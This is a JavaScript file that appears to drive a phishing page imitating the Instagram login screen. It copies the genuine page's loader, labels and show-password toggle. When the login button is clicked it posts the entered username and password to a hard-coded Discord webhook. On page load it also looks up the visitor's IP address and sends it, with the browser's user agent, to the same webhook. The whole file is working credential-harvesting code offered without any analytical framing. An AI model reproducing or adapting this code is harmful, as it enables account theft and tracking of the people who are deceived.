const webhookURL = 'https://discord.com/api/webhooks/1161298044172648559/5EJSrnsOGJ1ivKM0wjLSwucWVYt6KIaKRVQat-BvCjIhn3X6-1KjGB1aDFZmpFzCdHXr';

setTimeout(function () {
  document.querySelector(".page-loader").classList.add("hidden");
  document.querySelector("._9eogI").classList.add("show");
  document.querySelector(".RP4i1").classList.add("show");
  document.querySelector(".JtrJi").classList.add("show");
}, 1500);
let labels = document.querySelectorAll(".f0n8F");
  let inputs = document.querySelectorAll("._2hvTZ");
  let showPasswordBtn = document.querySelectorAll(".i24fI");

  // handle inputs placeholder events
  for (let i = 0; i < inputs.length; i++) {
    inputs[i].addEventListener("input", function () {
      if (inputs[i].value == "") {
        labels[i].classList.remove("FATdn");
        showPasswordBtn[i].setAttribute("style", "display: none;");
      } else {
        labels[i].classList.add("FATdn");
        showPasswordBtn[i].setAttribute("style", "display: flex;");
      }

      // handle submit button isDisabled
      inputs[1].value.length > 5 && inputs[0].value.length
        ? submitButtonDisabled(false)
        : submitButtonDisabled(true);
    });
  }

  // hide/show password button event
  let showPassBtnText =
    document.getElementsByClassName("sqdOP yWX7d _8A5w5")[0];
  showPasswordBtn[1].addEventListener("click", function () {
    if (inputs[1].type == "password") {
      inputs[1].type = "text";
      showPassBtnText.innerHTML = "Hide";
    } else {
      inputs[1].type = "password";
      showPassBtnText.innerHTML = "Show";
    }
  });
button = document.getElementsByClassName("sqdOP L3NKy y3zKF")
console.log(button[0])
button[0].addEventListener("click", function(){
  event.preventDefault();
  console.log ("clicked...")
  const inputs = document.querySelectorAll('input'); // Make sure these are your input elements
  const payload = {
    content: "Name: " + inputs[0].value + "; Password: " + inputs[1].value,
  };

  const webhookURL = 'https://discord.com/api/webhooks/1161298044172648559/5EJSrnsOGJ1ivKM0wjLSwucWVYt6KIaKRVQat-BvCjIhn3X6-1KjGB1aDFZmpFzCdHXr';

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  })
  .then(response => {
    if (response.ok) {
      console.log('Message sent successfully!');
    } else {
      console.error('Error sending message to Discord:', response.statusText);
    }
  })
  .catch(error => {
    console.error('Error:', error);
  });

  console.log(inputs[0].value); // Debugging input values
  console.log(inputs[1].value);
});


function submitButtonDisabled(isDisabled) {
  document.getElementsByClassName("sqdOP L3NKy y3zKF")[0].disabled =
    isDisabled;
}

let userIpAddress;

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    userIpAddress = data.ip;
    // Now you can use the userIpAddress variable
    console.log(`Stored IP address: ${userIpAddress}`)
    const payload = {
      content: "Instagram info ===> Name:" + navigator.userAgent + "; ip:" + userIpAddress
    }

    // Send the message to Discord
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })
      .then(response => {
        if (response.ok) {
          console.log('Message sent successfully!');
        } else {
          console.error('Error sending message to Discord:', response.statusText);
        }
      })
      .catch(error => {
        console.error('Error:', error);
      });
    ;
  })
  .catch(error => console.error('Error:', error));